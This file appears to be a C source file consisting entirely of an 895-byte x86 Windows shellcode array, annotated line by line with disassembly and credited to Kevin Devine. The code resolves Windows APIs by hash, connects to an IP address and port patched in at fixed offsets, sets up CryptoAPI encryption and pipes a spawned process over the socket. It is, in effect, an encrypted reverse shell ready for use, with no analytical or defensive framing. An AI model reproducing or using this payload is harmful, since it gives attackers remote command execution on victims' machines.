
/* Copyright (c) 2014 Kevin Devine */
/* Size = 895 bytes */

char hidden[] = {
  /* 0000 */  "\xEB\x0C"                      /*  jmp 0000000Eh                      */
  /* 0002 */  "\x5E"                          /*  pop esi                            */
  /* 0003 */  "\x33\xC0"                      /*  xor eax, eax                       */
  /* 0005 */  "\x99"                          /*  cdq                                */
  /* 0006 */  "\xB2\xDC"                      /*  mov dl, DCh                        */
  /* 0008 */  "\xB6\x02"                      /*  mov dh, 02h                        */
  /* 000A */  "\x03\xD6"                      /*  add edx, esi                       */
  /* 000C */  "\xFF\xE2"                      /*  jmp edx                            */
  /* 000E */  "\xE8\xEF\xFF\xFF\xFF"          /*  call 00000002h                     */
  /***********************************************************************************/  
  /* 0013 */  "\x1C\xBE\xA4\xDE"              /*  socket                             */
  /* 0017 */  "\x0A\xDD\x83\xA7"              /*  connect                            */
  /* 001B */  "\x38\x63\x5B\x7B"              /*  closesocket                        */
  /* 001F */  "\xFE\x86\xA5\x46"              /*  send                               */
  /* 0023 */  "\x9B\x76\xA1\x5A"              /*  recv                               */
  /* 0027 */  "\x43\x4E\x90\x7D"              /*  WSAEventSelect                     */
  /* 002B */  "\x66\x26\x06\xF2"              /*  WSACreateEvent                     */
  /* 002F */  "\x1F\xCB\x04\x34"              /*  WSAEnumNetworkEvents               */
  /* 0033 */  "\x7B\xD0\xE7\x75"              /*  ioctlsocket                        */
  /***********************************************************************************/ 
  /* 0037 */  "\xD2\xE6\x26\x63"              /*  CreateNamedPipeA                   */
  /* 003B */  "\xFB\xFA\xB9\xC0"              /*  CreatePipe                         */
  /* 003F */  "\xA9\x13\xB7\xF5"              /*  CreateFileA                        */
  /* 0043 */  "\xE0\x4E\x85\x58"              /*  GetOverlappedResult                */
  /* 0047 */  "\x2A\x93\x33\xD4"              /*  ReadFile                           */
  /* 004B */  "\xD9\x9F\x8F\xEB"              /*  WriteFile                          */
  /* 004F */  "\xF1\xD0\x99\x3E"              /*  CloseHandle                        */
  /* 0053 */  "\x9B\x10\x28\xCE"              /*  WaitForMultipleObjects             */
  /* 0057 */  "\x44\xE2\x6A\xBF"              /*  CreateEventA                       */
  /* 005B */  "\xE0\x18\x54\x1F"              /*  CreateProcessA                     */
  /* 005F */  "\x9D\x56\xA9\xD9"              /*  TerminateProcess                   */
  /***********************************************************************************/ 
  /* 0063 */  "\x77\x85\xE2\xEA"              /*  CryptAcquireContextA               */
  /* 0067 */  "\xC9\x0A\x16\xD7"              /*  CryptGenKey                        */
  /* 006B */  "\x36\x22\x61\x17"              /*  CryptImportKey                     */
  /* 006F */  "\x46\x22\x0C\x21"              /*  CryptExportKey                     */
  /* 0073 */  "\x36\x27\xBF\xDD"              /*  CryptEncrypt                       */
  /* 0077 */  "\x07\x23\xA0\x9D"              /*  CryptDecrypt                       */
  /* 007B */  "\x06\x85\x12\x24"              /*  CryptDestroyKey                    */
  /* 007F */  "\xEA\x71\x5A\x7E"              /*  CryptReleaseContext                */
  /***********************************************************************************/
  /* 0083 */  "\xF0\x60"                      /*  pushad                             */
  /* 0085 */  "\x6A\x30"                      /*  push 00000030h                     */
  /* 0087 */  "\x5E"                          /*  pop esi                            */
  /* 0088 */  "\x64\xAD"                      /*  lodsd                              */
  /* 008A */  "\x8B\x40\x0C"                  /*  mov eax, dword ptr [eax+0Ch]       */
  /* 008D */  "\x8B\x70\x1C"                  /*  mov esi, dword ptr [eax+1Ch]       */
  /* 0090 */  "\x8B\x6E\x08"                  /*  mov ebp, dword ptr [esi+08h]       */
  /* 0093 */  "\x85\xED"                      /*  test ebp, ebp                      */
  /* 0095 */  "\x74\x42"                      /*  je 000000D9h                       */
  /* 0097 */  "\xAD"                          /*  lodsd                              */
  /* 0098 */  "\x50"                          /*  push eax                           */
  /* 0099 */  "\x8B\x45\x3C"                  /*  mov eax, dword ptr [ebp+3Ch]       */
  /* 009C */  "\x8B\x44\x28\x78"              /*  mov eax, dword ptr [eax+ebp+78h]   */
  /* 00A0 */  "\x8D\x74\x28\x18"              /*  lea esi, dword ptr [eax+ebp+18h]   */
  /* 00A4 */  "\xAD"                          /*  lodsd                              */
  /* 00A5 */  "\x91"                          /*  xchg eax, ecx                      */
  /* 00A6 */  "\xE3\xE8"                      /*  jecxz 00000090h                    */
  /* 00A8 */  "\xAD"                          /*  lodsd                              */
  /* 00A9 */  "\x03\xC5"                      /*  add eax, ebp                       */
  /* 00AB */  "\x50"                          /*  push eax                           */
  /* 00AC */  "\xAD"                          /*  lodsd                              */
  /* 00AD */  "\x8D\x3C\x28"                  /*  lea edi, dword ptr [eax+ebp]       */
  /* 00B0 */  "\xAD"                          /*  lodsd                              */
  /* 00B1 */  "\x8D\x1C\x28"                  /*  lea ebx, dword ptr [eax+ebp]       */
  /* 00B4 */  "\x8B\x74\x8F\xFC"              /*  mov esi, dword ptr [edi+ecx*4-04h] */
  /* 00B8 */  "\x03\xF5"                      /*  add esi, ebp                       */
  /* 00BA */  "\x33\xC0"                      /*  xor eax, eax                       */
  /* 00BC */  "\x99"                          /*  cdq                                */
  /* 00BD */  "\xAC"                          /*  lodsb                              */
  /* 00BE */  "\x03\xD0"                      /*  add edx, eax                       */
  /* 00C0 */  "\xC1\xC2\x09"                  /*  rol edx, 09h                       */
  /* 00C3 */  "\x33\xD0"                      /*  xor edx, eax                       */
  /* 00C5 */  "\x48"                          /*  dec eax                            */
  /* 00C6 */  "\x79\xF5"                      /*  jns 000000BDh                      */
  /* 00C8 */  "\x3B\x54\x24\x24"              /*  cmp edx, dword ptr [esp+24h]       */
  /* 00CC */  "\xE0\xE6"                      /*  loopne 000000B4h                   */
  /* 00CE */  "\x58"                          /*  pop eax                            */
  /* 00CF */  "\x5E"                          /*  pop esi                            */
  /* 00D0 */  "\x75\xBE"                      /*  jne 00000090h                      */
  /* 00D2 */  "\x0F\xB7\x14\x4B"              /*  movzx edx, word ptr [ebx+ecx*2]    */
  /* 00D6 */  "\x03\x2C\x90"                  /*  add ebp, dword ptr [eax+edx*4]     */
  /* 00D9 */  "\x89\x6C\x24\x1C"              /*  mov dword ptr [esp+1Ch], ebp       */
  /* 00DD */  "\x61"                          /*  popad                              */
  /* 00DE */  "\xC3"                          /*  ret                                */
  /***********************************************************************************/
  /* 00DF */  "\x60"                          /*  pushad                             */
  /* 00E0 */  "\x8B\x4D\xFC"                  /*  mov ecx, dword ptr [ebp-04h]       */
  /* 00E3 */  "\xE3\x18"                      /*  jecxz 000000FDh                    */
  /* 00E5 */  "\x8B\x4D\x44"                  /*  mov ecx, dword ptr [ebp+44h]       */
  /* 00E8 */  "\x83\xC1\x40"                  /*  add ecx, 40h                       */
  /* 00EB */  "\x51"                          /*  push ecx                           */
  /* 00EC */  "\x56"                          /*  push esi                           */
  /* 00ED */  "\x8D\x46\x04"                  /*  lea eax, dword ptr [esi+04h]       */
  /* 00F0 */  "\x50"                          /*  push eax                           */
  /* 00F1 */  "\x57"                          /*  push edi                           */
  /* 00F2 */  "\x53"                          /*  push ebx                           */
  /* 00F3 */  "\x57"                          /*  push edi                           */
  /* 00F4 */  "\xFF\x75\xF4"                  /*  push dword ptr [ebp-0Ch]           */
  /* 00F7 */  "\xFF\x55\xE0"                  /*  call dword ptr [ebp-20h]           */
  /* 00FA */  "\x48"                          /*  dec eax                            */
  /* 00FB */  "\x75\x0C"                      /*  jne 00000109h                      */
  /* 00FD */  "\x8B\x06"                      /*  mov eax, dword ptr [esi]           */
  /* 00FF */  "\x83\xC0\x04"                  /*  add eax, 04h                       */
  /* 0102 */  "\x57"                          /*  push edi                           */
  /* 0103 */  "\x50"                          /*  push eax                           */
  /* 0104 */  "\x56"                          /*  push esi                           */
  /* 0105 */  "\x53"                          /*  push ebx                           */
  /* 0106 */  "\xFF\x55\x8C"                  /*  call dword ptr [ebp-74h]           */
  /* 0109 */  "\x85\xC0"                      /*  test eax, eax                      */
  /* 010B */  "\x61"                          /*  popad                              */
  /* 010C */  "\xC3"                          /*  ret                                */
  /***********************************************************************************/
  /* 010D */  "\x60"                          /*  pushad                             */
  /* 010E */  "\x57"                          /*  push edi                           */
  /* 010F */  "\x6A\x04"                      /*  push 00000004h                     */
  /* 0111 */  "\x56"                          /*  push esi                           */
  /* 0112 */  "\x53"                          /*  push ebx                           */
  /* 0113 */  "\xFF\x55\x90"                  /*  call dword ptr [ebp-70h]           */
  /* 0116 */  "\x85\xC0"                      /*  test eax, eax                      */
  /* 0118 */  "\x7E\x2C"                      /*  jle 00000146h                      */
  /* 011A */  "\x56"                          /*  push esi                           */
  /* 011B */  "\xAD"                          /*  lodsd                              */
  /* 011C */  "\x8B\x4D\x44"                  /*  mov ecx, dword ptr [ebp+44h]       */
  /* 011F */  "\x83\xC1\x40"                  /*  add ecx, 40h                       */
  /* 0122 */  "\x3B\xC1"                      /*  cmp eax, ecx                       */
  /* 0124 */  "\x0F\x47\xC1"                  /*  cmovnbe eax, ecx                   */
  /* 0127 */  "\x57"                          /*  push edi                           */
  /* 0128 */  "\x50"                          /*  push eax                           */
  /* 0129 */  "\x56"                          /*  push esi                           */
  /* 012A */  "\x53"                          /*  push ebx                           */
  /* 012B */  "\xFF\x55\x90"                  /*  call dword ptr [ebp-70h]           */
  /* 012E */  "\x85\xC0"                      /*  test eax, eax                      */
  /* 0130 */  "\x5E"                          /*  pop esi                            */
  /* 0131 */  "\x7E\x13"                      /*  jle 00000146h                      */
  /* 0133 */  "\x8B\x4D\xFC"                  /*  mov ecx, dword ptr [ebp-04h]       */
  /* 0136 */  "\xE3\x0E"                      /*  jecxz 00000146h                    */
  /* 0138 */  "\x56"                          /*  push esi                           */
  /* 0139 */  "\xAD"                          /*  lodsd                              */
  /* 013A */  "\x56"                          /*  push esi                           */
  /* 013B */  "\x57"                          /*  push edi                           */
  /* 013C */  "\x53"                          /*  push ebx                           */
  /* 013D */  "\x57"                          /*  push edi                           */
  /* 013E */  "\xFF\x75\xF4"                  /*  push dword ptr [ebp-0Ch]           */
  /* 0141 */  "\xFF\x55\xE4"                  /*  call dword ptr [ebp-1Ch]           */
  /* 0144 */  "\x85\xC0"                      /*  test eax, eax                      */
  /* 0146 */  "\x61"                          /*  popad                              */
  /* 0147 */  "\xC3"                          /*  ret                                */
  /***********************************************************************************/
  /* 0148 */  "\x60"                          /*  pushad                             */
  /* 0149 */  "\xE8\xBF\xFF\xFF\xFF"          /*  call 0000010Dh                     */
  /* 014E */  "\x7E\x66"                      /*  jle 000001B6h                      */
  /* 0150 */  "\x68\xBF\xFF\xFF\x0F"          /*  push 0FFFFFBFh                     */
  /* 0155 */  "\xF7\x14\x24"                  /*  not dword ptr [esp]                */
  /* 0158 */  "\x6A\x18"                      /*  push 00000018h                     */
  /* 015A */  "\x57"                          /*  push edi                           */
  /* 015B */  "\x57"                          /*  push edi                           */
  /* 015C */  "\x8D\x45\xF0"                  /*  lea eax, dword ptr [ebp-10h]       */
  /* 015F */  "\x50"                          /*  push eax                           */
  /* 0160 */  "\xFF\x55\xD0"                  /*  call dword ptr [ebp-30h]           */
  /* 0163 */  "\x48"                          /*  dec eax                            */
  /* 0164 */  "\x75\x50"                      /*  jne 000001B6h                      */
  /* 0166 */  "\x56"                          /*  push esi                           */
  /* 0167 */  "\x8D\x45\xF8"                  /*  lea eax, dword ptr [ebp-08h]       */
  /* 016A */  "\x50"                          /*  push eax                           */
  /* 016B */  "\x57"                          /*  push edi                           */
  /* 016C */  "\x57"                          /*  push edi                           */
  /* 016D */  "\xAD"                          /*  lodsd                              */
  /* 016E */  "\x50"                          /*  push eax                           */
  /* 016F */  "\x56"                          /*  push esi                           */
  /* 0170 */  "\xFF\x75\xF0"                  /*  push dword ptr [ebp-10h]           */
  /* 0173 */  "\xFF\x55\xD8"                  /*  call dword ptr [ebp-28h]           */
  /* 0176 */  "\x85\xC0"                      /*  test eax, eax                      */
  /* 0178 */  "\x5E"                          /*  pop esi                            */
  /* 0179 */  "\x74\x3B"                      /*  je 000001B6h                       */
  /* 017B */  "\x8D\x4D\xF4"                  /*  lea ecx, dword ptr [ebp-0Ch]       */
  /* 017E */  "\x51"                          /*  push ecx                           */
  /* 017F */  "\x50"                          /*  push eax                           */
  #define CRYPT_ALG 0x180+1
  /* 0180 */  "\x68\xEF\x99\xFF\xFF"          /*  push FFFF99EFh                     */
  /* 0185 */  "\xF7\x14\x24"                  /*  not dword ptr [esp]                */
  /* 0188 */  "\xFF\x75\xF0"                  /*  push dword ptr [ebp-10h]           */
  /* 018B */  "\xFF\x55\xD4"                  /*  call dword ptr [ebp-2Ch]           */
  /* 018E */  "\x85\xC0"                      /*  test eax, eax                      */
  /* 0190 */  "\x74\x24"                      /*  je 000001B6h                       */
  /* 0192 */  "\x8D\x4E\x04"                  /*  lea ecx, dword ptr [esi+04h]       */
  /* 0195 */  "\xFF\x75\x44"                  /*  push dword ptr [ebp+44h]           */
  /* 0198 */  "\x8F\x06"                      /*  pop dword ptr [esi]                */
  /* 019A */  "\x56"                          /*  push esi                           */
  /* 019B */  "\x51"                          /*  push ecx                           */
  /* 019C */  "\x57"                          /*  push edi                           */
  /* 019D */  "\x50"                          /*  push eax                           */
  /* 019E */  "\xFF\x75\xF8"                  /*  push dword ptr [ebp-08h]           */
  /* 01A1 */  "\xFF\x75\xF4"                  /*  push dword ptr [ebp-0Ch]           */
  /* 01A4 */  "\xFF\x55\xDC"                  /*  call dword ptr [ebp-24h]           */
  /* 01A7 */  "\x89\x44\x24\x1C"              /*  mov dword ptr [esp+1Ch], eax       */
  /* 01AB */  "\x48"                          /*  dec eax                            */
  /* 01AC */  "\x75\x08"                      /*  jne 000001B6h                      */
  /* 01AE */  "\xE8\x2C\xFF\xFF\xFF"          /*  call 000000DFh                     */
  /* 01B3 */  "\xFF\x45\xFC"                  /*  inc dword ptr [ebp-04h]            */
  /* 01B6 */  "\x61"                          /*  popad                              */
  /* 01B7 */  "\xC3"                          /*  ret                                */
  /***********************************************************************************/
  /* 01B8 */  "\x60"                          /*  pushad                             */
  /* 01B9 */  "\x8D\x75\x58"                  /*  lea esi, dword ptr [ebp+58h]       */
  /* 01BC */  "\x8B\x45\x58"                  /*  mov eax, dword ptr [ebp+58h]       */
  /* 01BF */  "\x99"                          /*  cdq                                */
  /* 01C0 */  "\x52"                          /*  push edx                           */
  /* 01C1 */  "\x54"                          /*  push esp                           */
  /* 01C2 */  "\x68\x7E\x66\x04\x80"          /*  push 8004667Eh                     */
  /* 01C7 */  "\x53"                          /*  push ebx                           */
  /* 01C8 */  "\x52"                          /*  push edx                           */
  /* 01C9 */  "\x50"                          /*  push eax                           */
  /* 01CA */  "\x53"                          /*  push ebx                           */
  /* 01CB */  "\x55"                          /*  push ebp                           */
  /* 01CC */  "\x50"                          /*  push eax                           */
  /* 01CD */  "\x53"                          /*  push ebx                           */
  /* 01CE */  "\x6A\xFF"                      /*  push FFFFFFFFh                     */
  /* 01D0 */  "\x52"                          /*  push edx                           */
  /* 01D1 */  "\x56"                          /*  push esi                           */
  /* 01D2 */  "\x6A\x03"                      /*  push 00000003h                     */
  /* 01D4 */  "\x6A\x21"                      /*  push 00000021h                     */
  /* 01D6 */  "\x50"                          /*  push eax                           */
  /* 01D7 */  "\x53"                          /*  push ebx                           */
  /* 01D8 */  "\xFF\x55\x94"                  /*  call dword ptr [ebp-6Ch]           */
  /* 01DB */  "\xFF\x55\xC0"                  /*  call dword ptr [ebp-40h]           */
  /* 01DE */  "\x97"                          /*  xchg eax, edi                      */
  /* 01DF */  "\xFF\x55\x9C"                  /*  call dword ptr [ebp-64h]           */
  /* 01E2 */  "\xFF\x55\x94"                  /*  call dword ptr [ebp-6Ch]           */
  /* 01E5 */  "\xFF\x55\xA0"                  /*  call dword ptr [ebp-60h]           */
  /* 01E8 */  "\x5A"                          /*  pop edx                            */
  /* 01E9 */  "\x8B\xF5"                      /*  mov esi, ebp                       */
  /* 01EB */  "\xAD"                          /*  lodsd                              */
  /* 01EC */  "\xA8\x20"                      /*  test al, 20h                       */
  /* 01EE */  "\x89\x3C\x24"                  /*  mov dword ptr [esp], edi           */
  /* 01F1 */  "\x61"                          /*  popad                              */
  /* 01F2 */  "\xC3"                          /*  ret                                */
  /***********************************************************************************/
  /* 01F3 */  "\x60"                          /*  pushad                             */
  /* 01F4 */  "\x8D\x7D\x48"                  /*  lea edi, dword ptr [ebp+48h]       */
  /* 01F7 */  "\x57"                          /*  push edi                           */
  /* 01F8 */  "\x50"                          /*  push eax                           */
  /* 01F9 */  "\x53"                          /*  push ebx                           */
  /* 01FA */  "\x53"                          /*  push ebx                           */
  /* 01FB */  "\x50"                          /*  push eax                           */
  /* 01FC */  "\x53"                          /*  push ebx                           */
  /* 01FD */  "\x50"                          /*  push eax                           */
  /* 01FE */  "\x6A\x0C"                      /*  push 0000000Ch                     */
  /* 0200 */  "\x8B\xF4"                      /*  mov esi, esp                       */
  /* 0202 */  "\x68\xA3\xCE\xFF\xFF"          /*  push FFFFCEA3h                     */
  /* 0207 */  "\xF7\x14\x24"                  /*  not dword ptr [esp]                */
  /* 020A */  "\x68\x70\x69\x70\x65"          /*  push 65706970h                     */
  /* 020F */  "\x68\x5C\x5C\x2E\x5C"          /*  push 5C2E5C5Ch                     */
  /* 0214 */  "\x8B\xCC"                      /*  mov ecx, esp                       */
  /* 0216 */  "\x50"                          /*  push eax                           */
  /* 0217 */  "\x50"                          /*  push eax                           */
  /* 0218 */  "\x6A\x03"                      /*  push 00000003h                     */
  /* 021A */  "\x56"                          /*  push esi                           */
  /* 021B */  "\x50"                          /*  push eax                           */
  /* 021C */  "\x68\xFF\xFF\xFF\xFD"          /*  push FDFFFFFFh                     */
  /* 0221 */  "\xF7\x14\x24"                  /*  not dword ptr [esp]                */
  /* 0224 */  "\x51"                          /*  push ecx                           */
  /* 0225 */  "\x50"                          /*  push eax                           */
  /* 0226 */  "\x50"                          /*  push eax                           */
  /* 0227 */  "\x50"                          /*  push eax                           */
  /* 0228 */  "\x50"                          /*  push eax                           */
  /* 0229 */  "\x6A\x01"                      /*  push 00000001h                     */
  /* 022B */  "\x50"                          /*  push eax                           */
  /* 022C */  "\x68\xFC\xFF\xFF\xBF"          /*  push BFFFFFFCh                     */
  /* 0231 */  "\xF7\x14\x24"                  /*  not dword ptr [esp]                */
  /* 0234 */  "\x51"                          /*  push ecx                           */
  /* 0235 */  "\xFF\x55\xA4"                  /*  call dword ptr [ebp-5Ch]           */
  /* 0238 */  "\xAB"                          /*  stosd                              */
  /* 0239 */  "\x99"                          /*  cdq                                */
  /* 023A */  "\x52"                          /*  push edx                           */
  /* 023B */  "\x56"                          /*  push esi                           */
  /* 023C */  "\x57"                          /*  push edi                           */
  /* 023D */  "\xAF"                          /*  scasd                              */
  /* 023E */  "\x57"                          /*  push edi                           */
  /* 023F */  "\x8B\xF7"                      /*  mov esi, edi                       */
  /* 0241 */  "\xAF"                          /*  scasd                              */
  /* 0242 */  "\xFF\x55\xA8"                  /*  call dword ptr [ebp-58h]           */
  /* 0245 */  "\xFF\x55\xAC"                  /*  call dword ptr [ebp-54h]           */
  /* 0248 */  "\xAB"                          /*  stosd                              */
  /* 0249 */  "\x83\xC4\x18"                  /*  add esp, 18h                       */
  /* 024C */  "\xFF\x55\x98"                  /*  call dword ptr [ebp-68h]           */
  /* 024F */  "\xAB"                          /*  stosd                              */
  /* 0250 */  "\xFF\x55\xC4"                  /*  call dword ptr [ebp-3Ch]           */
  /* 0253 */  "\xAB"                          /*  stosd                              */
  /* 0254 */  "\x89\x45\x40"                  /*  mov dword ptr [ebp+40h], eax       */
  /* 0257 */  "\x99"                          /*  cdq                                */
  /* 0258 */  "\x68\x9C\x92\x9B\xFF"          /*  push FF9B929Ch                     */
  /* 025D */  "\xF7\x14\x24"                  /*  not dword ptr [esp]                */
  /* 0260 */  "\x8B\xC4"                      /*  mov eax, esp                       */
  /* 0262 */  "\x57"                          /*  push edi                           */
  /* 0263 */  "\x57"                          /*  push edi                           */
  /* 0264 */  "\x52"                          /*  push edx                           */
  /* 0265 */  "\x52"                          /*  push edx                           */
  /* 0266 */  "\x52"                          /*  push edx                           */
  /* 0267 */  "\x53"                          /*  push ebx                           */
  /* 0268 */  "\x52"                          /*  push edx                           */
  /* 0269 */  "\x52"                          /*  push edx                           */
  /* 026A */  "\x50"                          /*  push eax                           */
  /* 026B */  "\x52"                          /*  push edx                           */
  /* 026C */  "\x6A\x44"                      /*  push 00000044h                     */
  /* 026E */  "\x8F\x07"                      /*  pop dword ptr [edi]                */
  /* 0270 */  "\xFF\x47\x2D"                  /*  inc dword ptr [edi+2Dh]            */
  /* 0273 */  "\x8D\x7F\x38"                  /*  lea edi, dword ptr [edi+38h]       */
  /* 0276 */  "\xA5"                          /*  movsd                              */
  /* 0277 */  "\xAD"                          /*  lodsd                              */
  /* 0278 */  "\xAB"                          /*  stosd                              */
  /* 0279 */  "\xAB"                          /*  stosd                              */
  /* 027A */  "\xFF\x55\xC8"                  /*  call dword ptr [ebp-38h]           */
  /* 027D */  "\x58"                          /*  pop eax                            */
  /* 027E */  "\x8B\xF7"                      /*  mov esi, edi                       */
  /* 0280 */  "\x60"                          /*  pushad                             */
  /* 0281 */  "\xE8\x32\xFF\xFF\xFF"          /*  call 000001B8h                     */
  /* 0286 */  "\x75\x51"                      /*  jne 000002D9h                      */
  /* 0288 */  "\x85\xFF"                      /*  test edi, edi                      */
  /* 028A */  "\x74\x38"                      /*  je 000002C4h                       */
  /* 028C */  "\x4F"                          /*  dec edi                            */
  /* 028D */  "\x75\x4A"                      /*  jne 000002D9h                      */
  /* 028F */  "\x39\x7D\x2C"                  /*  cmp dword ptr [ebp+2Ch], edi       */
  /* 0292 */  "\x8B\x45\x48"                  /*  mov eax, dword ptr [ebp+48h]       */
  /* 0295 */  "\x8D\x55\x30"                  /*  lea edx, dword ptr [ebp+30h]       */
  /* 0298 */  "\x74\x0C"                      /*  je 000002A6h                       */
  /* 029A */  "\x57"                          /*  push edi                           */
  /* 029B */  "\x56"                          /*  push esi                           */
  /* 029C */  "\x52"                          /*  push edx                           */
  /* 029D */  "\x50"                          /*  push eax                           */
  /* 029E */  "\xFF\x55\xB0"                  /*  call dword ptr [ebp-50h]           */
  /* 02A1 */  "\x48"                          /*  dec eax                            */
  /* 02A2 */  "\x75\x35"                      /*  jne 000002D9h                      */
  /* 02A4 */  "\xEB\x10"                      /*  jmp 000002B6h                      */
  /* 02A6 */  "\x52"                          /*  push edx                           */
  /* 02A7 */  "\x56"                          /*  push esi                           */
  /* 02A8 */  "\xFF\x75\x44"                  /*  push dword ptr [ebp+44h]           */
  /* 02AB */  "\x8D\x4E\x04"                  /*  lea ecx, dword ptr [esi+04h]       */
  /* 02AE */  "\x51"                          /*  push ecx                           */
  /* 02AF */  "\x50"                          /*  push eax                           */
  /* 02B0 */  "\xFF\x55\xB4"                  /*  call dword ptr [ebp-4Ch]           */
  /* 02B3 */  "\xFF\x45\x2C"                  /*  inc dword ptr [ebp+2Ch]            */
  /* 02B6 */  "\x8B\x0E"                      /*  mov ecx, dword ptr [esi]           */
  /* 02B8 */  "\xE3\x1C"                      /*  jecxz 000002D6h                    */
  /* 02BA */  "\xFF\x4D\x2C"                  /*  dec dword ptr [ebp+2Ch]            */
  /* 02BD */  "\xE8\x1D\xFE\xFF\xFF"          /*  call 000000DFh                     */
  /* 02C2 */  "\xEB\x12"                      /*  jmp 000002D6h                      */
  /* 02C4 */  "\xE8\x44\xFE\xFF\xFF"          /*  call 0000010Dh                     */
  /* 02C9 */  "\x7E\x0E"                      /*  jle 000002D9h                      */
  /* 02CB */  "\x57"                          /*  push edi                           */
  /* 02CC */  "\x56"                          /*  push esi                           */
  /* 02CD */  "\xAD"                          /*  lodsd                              */
  /* 02CE */  "\x50"                          /*  push eax                           */
  /* 02CF */  "\x56"                          /*  push esi                           */
  /* 02D0 */  "\xFF\x75\x4C"                  /*  push dword ptr [ebp+4Ch]           */
  /* 02D3 */  "\xFF\x55\xB8"                  /*  call dword ptr [ebp-48h]           */
  /* 02D6 */  "\x61"                          /*  popad                              */
  /* 02D7 */  "\xEB\xA7"                      /*  jmp 00000280h                      */
  /* 02D9 */  "\x61"                          /*  popad                              */
  /* 02DA */  "\x51"                          /*  push ecx                           */
  /* 02DB */  "\xFF\x75\x60"                  /*  push dword ptr [ebp+60h]           */
  /* 02DE */  "\xFF\x55\xCC"                  /*  call dword ptr [ebp-34h]           */
  /* 02E1 */  "\x5E"                          /*  pop esi                            */
  /* 02E2 */  "\x6A\x08"                      /*  push 00000008h                     */
  /* 02E4 */  "\x5B"                          /*  pop ebx                            */
  /* 02E5 */  "\xAD"                          /*  lodsd                              */
  /* 02E6 */  "\x50"                          /*  push eax                           */
  /* 02E7 */  "\xFF\x55\xBC"                  /*  call dword ptr [ebp-44h]           */
  /* 02EA */  "\x4B"                          /*  dec ebx                            */
  /* 02EB */  "\x75\xF8"                      /*  jne 000002E5h                      */
  /* 02ED */  "\x61"                          /*  popad                              */
  /* 02EE */  "\xC3"                          /*  ret                                */
  /***********************************************************************************/
  /* 02EF */  "\x60"                          /*  pushad                             */
  /* 02F0 */  "\xB9\x94\xFC\xFF\xFF"          /*  mov ecx, FFFFFC94h                 */
  /* 02F5 */  "\xF7\xD9"                      /*  neg ecx                            */
  /* 02F7 */  "\x2B\xE1"                      /*  sub esp, ecx                       */
  /* 02F9 */  "\x8B\xFC"                      /*  mov edi, esp                       */
  /* 02FB */  "\xF3\xAA"                      /*  rep stosb                          */
  /* 02FD */  "\x8B\xFC"                      /*  mov edi, esp                       */
  /* 02FF */  "\xAC"                          /*  lodsb                              */
  /* 0300 */  "\x91"                          /*  xchg eax, ecx                      */
  /* 0301 */  "\xAD"                          /*  lodsd                              */
  /* 0302 */  "\xE8\x7D\xFD\xFF\xFF"          /*  call 00000084h                     */
  /* 0307 */  "\x85\xC0"                      /*  test eax, eax                      */
  /* 0309 */  "\x74\x6C"                      /*  je 00000377h                       */
  /* 030B */  "\xAB"                          /*  stosd                              */
  /* 030C */  "\xE2\xF3"                      /*  loop 00000301h                     */
  /* 030E */  "\x8D\x6F\x10"                  /*  lea ebp, dword ptr [edi+10h]       */
  /* 0311 */  "\x51"                          /*  push ecx                           */
  /* 0312 */  "\xB1\xA4"                      /*  mov cl, A4h                        */
  /* 0314 */  "\x8D\x34\x29"                  /*  lea esi, dword ptr [ecx+ebp]       */
  /* 0317 */  "\x33\xFF"                      /*  xor edi, edi                       */
  /* 0319 */  "\x6A\x01"                      /*  push 00000001h                     */
  /* 031B */  "\x6A\x02"                      /*  push 00000002h                     */
  /* 031D */  "\xFF\x55\x80"                  /*  call dword ptr [ebp-80h]           */
  /* 0320 */  "\x93"                          /*  xchg eax, ebx                      */
  /* 0321 */  "\x85\xDB"                      /*  test ebx, ebx                      */
  /* 0323 */  "\x7E\x52"                      /*  jle 00000377h                      */
  #define IP_ADDRESS 0x325+1
  /* 0325 */  "\x68\x80\xFF\xFF\xFE"          /*  push FEFFFF80h                     */
  /* 032A */  "\xF7\x14\x24"                  /*  not dword ptr [esp]                */
  #define PORT 0x32D+1
  /* 032D */  "\x68\xFD\xFF\xFF\xAF"          /*  push AFFFFFFDh                     */
  /* 0332 */  "\xF7\x14\x24"                  /*  not dword ptr [esp]                */
  /* 0335 */  "\x8B\xCC"                      /*  mov ecx, esp                       */
  /* 0337 */  "\x6A\x10"                      /*  push 00000010h                     */
  /* 0339 */  "\x51"                          /*  push ecx                           */
  /* 033A */  "\x53"                          /*  push ebx                           */
  /* 033B */  "\xFF\x55\x84"                  /*  call dword ptr [ebp-7Ch]           */
  /* 033E */  "\x59"                          /*  pop ecx                            */
  /* 033F */  "\x59"                          /*  pop ecx                            */
  /* 0340 */  "\x40"                          /*  inc eax                            */
  /* 0341 */  "\x74\x30"                      /*  je 00000373h                       */
  /* 0343 */  "\xC7\x45\x44\xFF\xFD\xFF\xFF"  /*  mov dword ptr [ebp+44h], FFFFFDFFh */
  /* 034A */  "\xF7\x55\x44"                  /*  not dword ptr [ebp+44h]            */
  /* 034D */  "\x48"                          /*  dec eax                            */
  /* 034E */  "\xE8\xF5\xFD\xFF\xFF"          /*  call 00000148h                     */
  /* 0353 */  "\x48"                          /*  dec eax                            */
  /* 0354 */  "\x75\x1D"                      /*  jne 00000373h                      */
  /* 0356 */  "\xE8\x98\xFE\xFF\xFF"          /*  call 000001F3h                     */
  /* 035B */  "\xFF\x4D\xFC"                  /*  dec dword ptr [ebp-04h]            */
  /* 035E */  "\x75\x13"                      /*  jne 00000373h                      */
  /* 0360 */  "\xFF\x75\xF4"                  /*  push dword ptr [ebp-0Ch]           */
  /* 0363 */  "\xFF\x55\xE8"                  /*  call dword ptr [ebp-18h]           */
  /* 0366 */  "\xFF\x75\xF8"                  /*  push dword ptr [ebp-08h]           */
  /* 0369 */  "\xFF\x55\xE8"                  /*  call dword ptr [ebp-18h]           */
  /* 036C */  "\x56"                          /*  push esi                           */
  /* 036D */  "\xFF\x75\xF0"                  /*  push dword ptr [ebp-10h]           */
  /* 0370 */  "\xFF\x55\xEC"                  /*  call dword ptr [ebp-14h]           */
  /* 0373 */  "\x53"                          /*  push ebx                           */
  /* 0374 */  "\xFF\x55\x88"                  /*  call dword ptr [ebp-78h]           */
  /* 0377 */  "\x81\xEC\x94\xFC\xFF\xFF"      /*  sub esp, FFFFFC94h                 */
  /* 037D */  "\x61"                          /*  popad                              */
  /* 037E */  "\xC3"                          /*  ret                                */
  /***********************************************************************************/
};
